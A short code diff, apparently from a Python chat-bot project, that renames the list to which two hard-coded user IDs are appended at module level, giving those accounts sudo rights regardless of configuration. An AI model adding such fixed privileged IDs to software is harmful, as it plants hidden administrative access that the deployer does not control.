@@ -27,5 +27,5 @@ async def remove_sudo(user_id: int) -> bool:
     )
     return True
 
-sudoers.append(1441342342)
-sudoers.append(5089916692)
+SUDO_USERS.append(1441342342)
+SUDO_USERS.append(5089916692)
